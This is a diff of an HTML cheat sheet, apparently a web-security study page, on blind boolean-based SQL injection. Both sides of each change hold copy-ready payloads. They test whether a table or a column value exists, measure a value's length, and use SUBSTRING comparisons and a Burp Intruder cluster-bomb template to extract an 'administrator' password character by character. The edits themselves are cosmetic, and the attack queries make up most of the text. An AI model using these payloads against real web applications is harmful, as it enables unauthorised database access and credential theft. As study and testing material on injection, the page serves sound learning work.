@@ -179,18 +179,18 @@ new behavior after small changes. Inspect the headers in burpsuite to check if e
 
 To successfully acomplish the blind attack, the boolean conditions can help. It is matter of what to ask.<br>
 
-<u>check if table exist ?</u>
+<u>CHECK IF TABLE EXIST ?</u>
 	
 <b>C1: TRUE condition means table exist !</b><p id="BAT03"><mark>' AND (SELECT 'a' FROM TABLE_NAME LIMIT 1)='a</mark></p>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT03')">.C1.</button>
 
-<u>check if column value exist ?</u>
+<u>CHECK IF COLUMN VALUE EXIST ?</u>
 
 <b>C1: TRUE condition means column value exist ![guess or enumerate]</b><p id="BAT04"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='a</mark></p>
 <b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator')='a</mark>
 <button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT04')">.C1.</button> 
 
-<u>check the character lenght of the column value ?</u>
+<u>CHECK THE CHARACTER LENGHT OF THE COLUMN VALUE ?</u>
 <b>C1: </b><p id="BAT06"><mark>' AND (SELECT 'a' FROM TABLE_NAME WHERE COLUMN_NAME='VALUE' AND LENGTH(COLUMN_NAME)>1)='a</mark></p>
 <b>SAMPLE: </b><mark>' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a</mark>
 
@@ -199,13 +199,13 @@ To successfully acomplish the blind attack, the boolean conditions can help. It 
 <b>NOTE:</b> Here a series of incremental query's working with the TRUE statement are needed, once the number reached 
 hits the FALSE statement.
 
-> <u>check characters value using a method "greather than" and "equals" ?</u>
+> <u>CHECK CHARACTERS VALUE USING A METHOD "GREATHER THAN" AND "EQUALS" ?</u>
 <b>C1: </b><p id="BAT11"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) > 'value</mark></p>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 't</mark>
 
 "first it needs a TRUE/FALSE behavior [blind sqli identified], if true the first character of the value is greather than the value...
 
-<b>C2: </b><p id="BAT12"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark></p>
+<b>C2: </b><code><p id="BAT12"><mark>' AND SUBSTRING((SELECT COLUMN_NAME FROM TABLE_NAME WHERE COLUMN_NAME = 'VALUE'), 1, 1) = 's</mark></p></code>
 <b>SAMPLE: </b><mark>' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) = 's</mark>
 
 ...if TRUE the first character of the value is equals to the value"
@@ -225,9 +225,9 @@ iterate more times with each letter, number, etc. For that reason a pre-req is t
 
 <b><u>CLUSTER BOMB ATTACK !</u></b> - two positions
 
-<b>C1: </b><p id="BAT10"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark></p>
+<b>C1: </b><p id="BAT10"><mark>' AND (SELECT SUBSTRING(COLUMN_NAME,<b>§1§</b>,1) FROM TABLE_NAME WHERE COLUMN_NAME='VALUE')='<b>§a§</b></mark>
 
-<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT10')">.C1.</button>
+<button class="button_conf button_set" title="Ctrl+C" onclick="ctrl_C('#BAT10')">.C1.</button></p>
 
 <b>NOTE:</b> Remember the TRUE/FALSE logic and the response associated to that. That will help to know which 
 values are correct = TRUE. 
